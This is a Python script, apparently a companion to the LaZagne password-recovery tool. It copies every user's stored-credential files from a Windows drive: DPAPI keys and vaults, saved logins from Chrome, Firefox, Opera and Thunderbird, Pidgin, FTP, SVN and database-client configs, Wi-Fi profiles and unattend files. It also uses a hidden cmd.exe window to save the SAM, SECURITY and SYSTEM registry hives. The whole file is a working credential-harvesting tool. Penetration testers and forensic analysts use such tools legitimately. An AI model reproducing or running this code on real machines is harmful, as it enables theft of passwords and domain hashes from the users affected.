#!/usr/bin/env python
# -*- coding: utf-8 -*- 
import _subprocess as sub
import subprocess
import shutil
import json
import os

user_softwares = [
					##################### DPAPI ####################
					{
						'name' 		: 'DPAPI',
						'subfolder'	: 'Roaming',
						'paths'		: [
										u'{drive}:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Protect',		# Protect folder
										u'{drive}:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Credentials', 	# Credentials folder (domain password, etc.)
										u'{drive}:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Vault',		
									],
					},
					{
						'name' 		: 'DPAPI',
						'subfolder'	: 'Local',
						'paths'		: [
										u'{drive}:\\Users\\{user}\\AppData\\Local\\Microsoft\\Credentials',	
										u'{drive}:\\Users\\{user}\\AppData\\Local\\Microsoft\\Vault', 			# Vault folder (internet explorer password, etc.)
									],
					},

					##################### Browsers ####################
					{
						'name' 		: 'Chrome',
						'paths'		: [u'{drive}:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data'],
						'profile'	: u'Local State',
						'files'		: [u'Login Data']
					},
					{
						'name' 		: 'Coccoc',
						'paths'		: [u'{drive}:\\Users\\{user}\\AppData\\Local\\CocCoc\\Browser\\User Data'],
						'profile'	: u'Local State',
						'files'		: [u'Login Data']
					},
					{
						'name' 	: 'Firefox',
						'paths'	: [u'{drive}:\\Users\\{user}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles'],
						'files'	: [
									u'key3.db',
									u'logins.json',
									u'cert8.db'
								]
					},
					{
						'name' 	: 'Opera',
						'paths'	: [u'{drive}:\\Users\\{user}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data'],
					},


					##################### Chats ####################
					{
						'name' 	: 'Pidgin',
						'paths'	: [u'{drive}:\\Users\\{user}\\AppData\\Roaming\\.purple\\accounts.xml'],
					},

					##################### Databases #####################

					{
						'name' 	: 'Dbvis',
						'paths'	: [u'{drive}:\\Users\\{user}\\.dbvis\\config70\\dbvis.xml'],
					},
					{
						'name' 	: 'Robomongo',
						'paths'	: [
									u'{drive}:\\Users\\{user}\\.config\Robomongo\\robomongo.json',	# old version
									u'{drive}:\\Users\\{user}\\.3T\\robo-3t\\1.1.1\\robo3t.json', 	# new version
								],
					},
					{
						'name' 	: 'Squirrel',
						'paths'	: [u'{drive}:\\Users\\{user}\\.squirrel-sql\\SQLAliases23.xml'],
					},
					{
						'name' 	: 'SQL Developer',
						'paths'	: [u'{drive}:\\Users\\{user}\\AppData\\Roaming\\SQL Developer'],
					},

					##################### Mails #####################
					{
						'name' 	: 'Thunderbird',
						'paths'	: [u'{drive}:\\Users\\{user}\\AppData\\Roaming\\Thunderbird\\Profiles'],
						'files'	: [
									u'key3.db',
									u'logins.json',
									u'cert8.db'
								]
					},

					##################### SVN #####################
					{
						'name' 	: 'Tortoise',
						'paths'	: [u'{drive}:\\Users\\{user}\\AppData\\Roaming\\Subversion\\auth\\svn.simple'],
					},

					##################### Sysadmin #####################
					{
						'name' 	: 'ApacheDirectoryStudio',
						'paths'	: [u'{drive}:\\Users\\{user}\\.ApacheDirectoryStudio\\.metadata\\.plugins\\org.apache.directory.studio.connection.core\\connections.xml'],
					},
					{
						'name' 	: 'Filezilla',
						'paths'	: [
									u'{drive}:\\Users\\{user}\\AppData\\Roaming\\FileZilla\\sitemanager.xml', 
									u'{drive}:\\Users\\{user}\\AppData\\Roaming\\FileZilla\\recentservers.xml', 
									u'{drive}:\\Users\\{user}\\AppData\\Roaming\\FileZilla\\filezilla.xml'
								],
					},
					{
						'name' 	: 'FTP Navigator',
						'paths'	: [u'{drive}:\\FTP Navigator\\Ftplist.txt'],
					},
				]

system_softwares = [
						##################### DPAPI ####################
						{
							'name' 		: 'DPAPI',
							'paths'		: [
											u'{drive}:\\Windows\\System32\\Microsoft\\Protect',
											u'{drive}:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Vault'
										],
						},

						##################### Unattended ####################
						{
							'name' 	: 'Unattended',
							'paths'	: [
										u'{drive}:\\Windows\\Panther\\Unattend.xml', 
										u'{drive}:\\Windows\\Panther\\Unattended.xml',
										u'{drive}:\\Windows\\Panther\\Unattend\\Unattended.xml',
										u'{drive}:\\Windows\\Panther\\Unattend\\Unattend.xml',
										u'{drive}:\\Windows\\System32\\\Sysprep\\unattend.xml',
										u'{drive}:\\Windows\\System32\\Sysprep\\Panther\\unattend.xml',

									],
						},

						##################### Wifi ####################
						{
							'name' 	: 'Wifi',
							'paths'	: [
										u'{drive}:\\ProgramData\\Microsoft\\Wlansvc\\Profiles\\Interfaces', 
									],
						},
					]

# Get user list to retrieve  their passwords
def get_user_list_on_filesystem(drive):
	# Check users existing on the system (get only directories)
	user_path = u'{drive}:\\Users'.format(drive=drive)
	all_users = []
	if os.path.exists(user_path):
		all_users = os.listdir(user_path)
	
		# Remove default users
		for user in [u'All Users', u'Default User', u'Default', u'Public', u'desktop.ini']:
			if user in all_users:
				all_users.remove(user)

	return all_users

# should work on a windows from a linux and windows host 
def get_basename(path):
	basename = path.split('\\')
	return basename[len(basename)-1]

def copy_dir(src, path):
	dst = '{path}\{src_basename}'.format(path=path, src_basename=get_basename(src))
	
	try:
		if os.path.isdir(src):
			shutil.copytree(src, dst)
		else:
			shutil.copy(src, dst)
		print '[+] Copied: {src}'.format(src=src)
		return True
	except:
		print '[-] Failed to copied: {src}'.format(src=src)
		return False

def create_dir(directory):
	if not os.path.exists(directory):
		os.makedirs(directory)
		print '[+] Creating directory: {directory}'.format(directory=directory)
		return True
	else:
		return False

# check to to it offline using only the filesystem: http://resources.infosecinstitute.com/registry-forensics-regripper-command-line-linux/
def run_cmd(cmdline):
		command 			= ['cmd.exe', '/c', cmdline]
		info 				= subprocess.STARTUPINFO()
		info.dwFlags 		= sub.STARTF_USESHOWWINDOW
		info.wShowWindow 	= sub.SW_HIDE
		p 					= subprocess.Popen(command, startupinfo=info, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, universal_newlines=True)
		results, _ 			= p.communicate()

def save_hives(directory):
	create_dir(directory)

	hives = ['sam', 'security', 'system']
	for h in hives:
		try:
			cmd = 'reg.exe save hklm\{hive} {output_name}'.format(hive=h, output_name=os.path.join(directory, h.upper()))
			run_cmd(cmd)
			print '[+] Dump {hive_name} hive'.format(hive_name=h)
		except Exception, e:
			return False
	return True


def dump(drive= u'C', folder_results=u'dump', zip_folder=False):

	users_folder 	= os.path.join(folder_results, u'Users')
	system_folder 	= os.path.join(folder_results, u'System')

	create_dir(folder_results)
	create_dir(users_folder)
	create_dir(system_folder)

	# loop through all user visible on C:\Users
	for user in get_user_list_on_filesystem(drive):
		
		user_folder = os.path.join(users_folder, user)
		create_dir(user_folder)

		# loop through all softwares supported by lazagne
		for software in user_softwares:
			# get all file path needed to be dumped 
			for path in software['paths']:
				path = path.format(drive=drive, user=user)
				
				if os.path.exists(path):
					software_folder = os.path.join(user_folder, software['name'])
					if 'subfolder' in software:
						software_folder = os.path.join(software_folder, software['subfolder'])
					
					create_dir(software_folder)
					
					# manage software exception: to dump multiple profiles
					if software['name'] == 'Firefox' or software['name'] == 'Thunderbird':
						for profile in os.listdir(path):
							profile_folder = os.path.join(software_folder, profile)
							create_dir(profile_folder)
							for file in software['files']:
								src = os.path.join(path, profile, file)
								copy_dir(src, profile_folder)

					elif software['name'] == 'Chrome' or software['name'] == 'Coccoc':
						profiles = []
						if os.path.exists(os.path.join(path, software['profile'])):
							with open(os.path.join(path, software['profile'])) as file: 
								data = json.load(file)
								for profile in data['profile']['info_cache']:
									profiles.append(profile)
							
							for profile in profiles:
								profile_folder = os.path.join(software_folder, profile)
								create_dir(profile_folder)
								for file in software['files']:
									src = os.path.join(path, profile, file)
									copy_dir(src, profile_folder)

					# manage software exception: when the file name change between version
					elif software['name'] == 'SQL Developer':
						new_directory = ''
						for p in os.listdir(path):
							# a subdirectory begins with systemxxxx
							if p.startswith('system'):
								new_directory = os.path.join(path, p)

								for p in os.listdir(new_directory):
									if p.startswith(u'o.sqldeveloper'):
										xml_file = os.path.join(new_directory, p, u'product-preferences.xml')
										if os.path.exists(xml_file):
											copy_dir(xml_file, software_folder)

									if p.startswith(u'o.jdeveloper'):
										xml_file = os.path.join(new_directory, p, u'connections.xml')
										if os.path.exists(xml_file):
											copy_dir(xml_file, software_folder)
								break

					# copy file for softwares without exceptions
					else:
						copy_dir(path, software_folder)


	# system information
	for software in system_softwares:
		# get all file path needed to be dumped 
		for path in software['paths']:
			path = path.format(drive=drive)
			
			if os.path.exists(path):
				software_folder = os.path.join(system_folder, software['name'])
				create_dir(software_folder)
				copy_dir(path, software_folder)

	save_hives(directory=os.path.join(system_folder, 'Hives'))

	if not zip_folder:
		print '[+] Directory created: {directory}'.format(directory=folder_results)


if __name__ == '__main__':
	file = 'dump'
	
	dump(folder_results=file)